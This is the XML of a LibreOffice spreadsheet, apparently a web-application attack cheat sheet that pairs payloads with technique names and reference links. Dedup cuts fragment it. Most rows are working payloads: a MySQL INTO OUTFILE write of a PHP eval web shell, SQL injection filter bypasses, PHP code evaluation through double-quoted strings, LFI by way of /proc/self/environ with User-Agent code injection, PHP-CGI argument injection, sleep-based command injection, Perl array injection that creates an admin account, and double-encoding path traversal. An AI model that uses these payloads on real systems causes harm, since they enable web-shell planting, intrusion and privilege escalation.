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8327in"/>
    </style:style>
    <style:style style:name="co3" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.3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uln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/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>into outfile '/var/www/.a.php' lines terminated by '&lt;?php eval($_POST[cmd]);?&gt;'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hell Upload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**/union/**/select/**/1,2,3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%09union%0Dselect%A01,2,3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-1)union(select(1),2,3)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ECT 0x666f6f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Single quote, string to hex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$db_user = "root ${@phpinfo()}"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Double Quote Evalutat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$db_user= "root <text:a xlink:href="mailto:$%7B@eval" xlink:type="simple">${@eval</text:a>($_POST[cmd])}";</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>PHP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Double Quote Evalutat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R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./../../etc/passwd%00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FI Detec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ocal File Inclus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dule=../../../../proc/self/environ </text:p>
            <text:p>User-Agent: &lt;?php file_put_contents('.a.php',$_POST[c]); ?&gt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LFI via UserAgent and /proc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Local File Inclu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ex.php?-s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HP CGI Agrumen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PHP-CGI Argument Inject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x.php?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp://input</text:p>
            <text:p>POST Data: &lt;?php phpinfo(); ?&gt;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HP CGI Agrument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PHP-CGI Argument Injecti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@list = ( 'Ba', 'Ba', 'Banana');</text:p>
            <text:p>$hash = { 'A' =&gt; 'Apple',</text:p>
            <text:p> 'B' =&gt; 'Banana',</text:p>
            <text:p> 'C' =&gt; @list };</text:p>
            <text:p>print Dumper($hash); # correct!</text:p>
            <text:p>$hash = { 'A' =&gt; 'Apple',</text:p>
            <text:p> 'B' =&gt; 'Banana',</text:p>
            <text:p> 'C' =&gt; 'Ba',</text:p>
            <text:p> 'Ba' =&gt; 'Banana' };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POC of Perl array injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploit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y $otheruser = Bugzilla::User-&gt;create(</text:p>
            <text:p>{</text:p>
            <text:p> login_name =&gt; $login_name,</text:p>
            <text:p> realname =&gt; $cgi-&gt;param('realname'),</text:p>
            <text:p> cryptpassword =&gt; $password</text:p>
            <text:p>});</text:p>
            <text:p># index.cgi?realname=xxx&amp;realname=login_name&amp;realname=admin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Demo exploit of Perl array injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploi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/backup/20150707_002dfa0f3ac08429.zip</text:p>
            <text:p>/backup/201507~1.zip</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploit</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Windows Til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ell.php # shel&gt;.php # shell"php # shell.&lt;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ndows API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cal File Inclu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wnload.php::$data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ndows NFT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ocal File Inclusion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="http://blog.csdn.net/yiyefangzhou24/article/details/17190135" xlink:type="simple">http://blog.csdn.net/yiyefangzhou24/article/details/17190135</text:a></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>INTO OUTFILE 'plugins::$index_allocation'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Create Folder with MySQL 5.1 on Windows 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|sleep 7|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;sleep 7;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$(sleep 7)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?arg[0]=uid.jpg%0A</text:p>
            <text:p>&amp;arg[1]=sleep</text:p>
            <text:p>&amp;arg[2]=7%0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lumn Truncation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SET=utf8</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploit</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SQL inj</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="http://websec.github.io/unicode-security-guide/character-transformations/" xlink:type="simple">http://websec.github.io/unicode-security-guide/character-transformations/</text:a></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>uid=0x31206f7220313d31 </text:p>
            <text:p># 1 or 1=1</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>PHP is_numeric()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QL inj</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>$uid = $_GET['uid'];</text:p>
            <text:p>if ( is_numeric($uid) )</text:p>
            <text:p> query("INSERT INTO blacklist VALUES($uid)");</text:p>
            <text:p>$uids = query("SELECT uid FROM blacklist");</text:p>
            <text:p>foreach ($uids as $uid) {</text:p>
            <text:p> show( query("SELECT log FROM logs WHERE uid=$uid") );</text:p>
            <text:p>}</text:p>
            <text:p>// </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>.%252e</text:p>
            <text:p><text:a xlink:href="http://hackme.cc:8080/sub/.%252e/" xlink:type="simple">http://hackme.cc:8080/sub/.%252e/</text:a>jmx-console/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mod_jk, access tomcat, jmx console</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploit</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Double Enco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hackme.cc/admin%252f" xlink:type="simple">http://hackme.cc/admin%252f</text:a>%252ehtaccess%2500.cfm</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ColdFusion</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploit</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Double Encod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ython</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://access.redhat.com/blogs/766093/posts/2592591" xlink:type="simple">https://access.redhat.com/blogs/766093/posts/259259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1:01:48.617083632</meta:creation-date>
    <dc:date>2016-10-11T12:28:20.984531157</dc:date>
    <meta:editing-duration>PT1H23M54S</meta:editing-duration>
    <meta:editing-cycles>13</meta:editing-cycles>
    <meta:generator>LibreOffice/4.2.8.2$Linux_X86_64 LibreOffice_project/420m0$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="1" meta:cell-count="116" meta:object-count="0"/>
  </office:meta>
</office:document-meta>
</file>